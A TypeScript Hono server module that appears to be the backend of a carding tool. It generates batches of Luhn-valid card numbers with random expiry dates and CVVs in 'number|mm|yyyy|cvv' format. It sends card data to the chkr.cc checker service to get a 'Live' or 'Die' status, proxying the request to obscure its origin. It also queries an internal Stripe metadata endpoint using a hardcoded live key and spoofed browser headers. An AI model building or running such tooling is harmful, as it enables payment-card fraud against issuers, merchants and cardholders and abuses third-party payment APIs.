import { Hono } from 'hono';
import { zValidator } from '@hono/zod-validator';
import { z } from 'zod';

export const toolsRouter = new Hono();

// ==========================================
// 1. GENERATE CARDS LOGIC
// ==========================================

const generateCardsSchema = z.object({
  bin: z.string()
    .min(1, "BIN must be provided")
    .max(16, "BIN cannot exceed 16 digits")
    .regex(/^[0-9]+$/, "BIN must contain only numbers"),
  quantity: z.number().min(1).max(500).default(10)
});

function getCardNetworkSpecs(bin: string) {
  if (bin.startsWith('34') || bin.startsWith('37')) return { network: 'American Express', length: 15, cvvLength: 4 };
  if (bin.startsWith('4')) return { network: 'Visa', length: 16, cvvLength: 3 };
  if (/^5[1-5]/.test(bin) || /^2[2-7]/.test(bin)) return { network: 'Mastercard', length: 16, cvvLength: 3 };
  if (bin.startsWith('6')) return { network: 'Discover', length: 16, cvvLength: 3 };
  if (bin.startsWith('35')) return { network: 'JCB', length: 16, cvvLength: 3 };
  if (/^3(?:0[0-5]|[68])/.test(bin)) return { network: 'Diners Club', length: 14, cvvLength: 3 };
  return { network: 'Unknown/Custom', length: 16, cvvLength: 3 };
}

/**
 * Cryptographically secure, unbiased integer generation.
 * Utilizes rejection sampling to eliminate modulo bias.
 */
function getSecureRandomInt(min: number, max: number): number {
  const range = max - min + 1;
  const maxValid = 256 - (256 % range);
  const array = new Uint8Array(1);
  let rnd: number;
  
  do {
    crypto.getRandomValues(array);
    rnd = array[0];
  } while (rnd >= maxValid); // Reject values that cause statistical bias
  
  return min + (rnd % range);
}

function generateLuhnValidNumber(bin: string, totalLength: number): string {
  let cardNumber = bin;
  
  // Fill entropy preserving space for the check digit
  while (cardNumber.length < totalLength - 1) {
    cardNumber += getSecureRandomInt(0, 9).toString();
  }

  let sum = 0;
  let isEven = true; 
  
  // Calculate check digit based on structurally valid payload length
  for (let i = cardNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(cardNumber.charAt(i), 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  
  const checkDigit = (10 - (sum % 10)) % 10;
  return cardNumber + checkDigit;
}

toolsRouter.post('/generate-cards', zValidator('json', generateCardsSchema), (c) => {
  const { bin, quantity } = c.req.valid('json');

  const specs = getCardNetworkSpecs(bin);
  const currentYear = new Date().getFullYear();
  const generatedCards = [];
  
  // Prevent buffer overflow by truncating base BIN if it equals or exceeds target network length
  const baseBin = bin.length >= specs.length ? bin.substring(0, specs.length - 1) : bin;

  for (let i = 0; i < quantity; i++) {
    const number = generateLuhnValidNumber(baseBin, specs.length);
    
    // Secure bounds for full calendar compatibility
    const month = String(getSecureRandomInt(1, 12)).padStart(2, '0');
    const year = String(currentYear + getSecureRandomInt(0, 5)); 
    
    // Dynamic CVV generation strictly adhering to network specifications
    const cvv = Array.from({ length: specs.cvvLength }, () => getSecureRandomInt(0, 9)).join('');

    generatedCards.push({
      network: specs.network,
      number,
      expMonth: month,
      expYear: year,
      cvv,
      formattedString: `${number}|${month}|${year}|${cvv}`
    });
  }

  return c.json({ 
    success: true,
    metadata: { baseBin, networkDetected: specs.network, vectorLength: specs.length },
    cards: generatedCards 
  });
});


// ==========================================
// 2. LIVE VERIFY GATEWAY (chkr.cc API Integration)
// ==========================================

const checkCardSchema = z.object({
  cardPayload: z.string().min(5, "Payload too short")
});

/**
 * Live Gateway Check
 * Proxies the request through Cloudflare Workers to bypass CORS and obscure the origin.
 */
toolsRouter.post('/check-card', zValidator('json', checkCardSchema), async (c) => {
  const { cardPayload } = c.req.valid('json');

  try {
    const response = await fetch("https://api.chkr.cc/", {
      method: "POST",
      headers: {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json; charset=UTF-8",
        "priority": "u=1, i",
        "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "Referer": "https://chkr.cc/"
      },
      body: JSON.stringify({ data: cardPayload, charge: false })
    });

    if (!response.ok) {
      return c.json({ 
        success: false, 
        status: 'Unknown', 
        message: `Upstream Gateway Error (${response.status})` 
      });
    }

    const data = await response.json() as any;

    // Map the external API status to our frontend's strongly typed CheckStatus
    let status: 'Live' | 'Die' | 'Unknown' = 'Unknown';
    if (data.status === 'Live') status = 'Live';
    else if (data.status === 'Die') status = 'Die';

    // Enhance the message by appending bank information if available
    const bankInfo = data.card?.bank ? ` - ${data.card.bank}` : '';
    const rawMessage = data.message || 'No response message';

    return c.json({ 
      success: true, 
      status, 
      message: `${rawMessage}${bankInfo}` 
    });

  } catch (error) {
    return c.json({ 
      success: false, 
      status: 'Unknown', 
      message: 'Network execution failed during upstream fetch' 
    });
  }
});


// ==========================================
// 3. STRIPE BIN LOOKUP PROXY
// ==========================================

const checkBinSchema = z.object({
  bin: z.string()
    .min(6, "BIN must be at least 6 digits")
    .max(16)
    .regex(/^[0-9]+$/, "BIN must contain only numbers")
});

/**
 * Stripe Edge-Internal Proxy
 * Safely fetches metadata without exposing CORS headers to the client.
 */
toolsRouter.post('/check-bin', zValidator('json', checkBinSchema), async (c) => {
  const { bin } = c.req.valid('json');
  
  try {
    // Utilize the Worker's global fetch API to act as a secure proxy
    const response = await fetch(`https://api.stripe.com/edge-internal/card-metadata?bin_prefix=${bin}&key=pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pbEJguCVAlqCxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n`, {
      method: 'GET',
      headers: {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "priority": "u=1, i",
        "sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Google Chrome\";v=\"145\", \"Chromium\";v=\"145\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "Referer": "https://js.stripe.com/"
      }
    });

    if (!response.ok) {
      return c.json({ success: false, message: 'Failed to query upstream metadata provider' });
    }

    const data = await response.json() as any;
    
    if (data?.data && data.data.length > 0) {
      const info = data.data[0];
      return c.json({
        success: true,
        metadata: {
          brand: info.brand || 'UNKNOWN',
          country: info.country || 'UNKNOWN',
          funding: info.funding || 'UNKNOWN',
          pan_length: info.pan_length || 16
        }
      });
    }

    return c.json({ success: false, message: 'BIN not found in metadata registry' });
  } catch (error) {
    return c.json({ success: false, message: 'Network execution failed during upstream fetch' });
  }
});
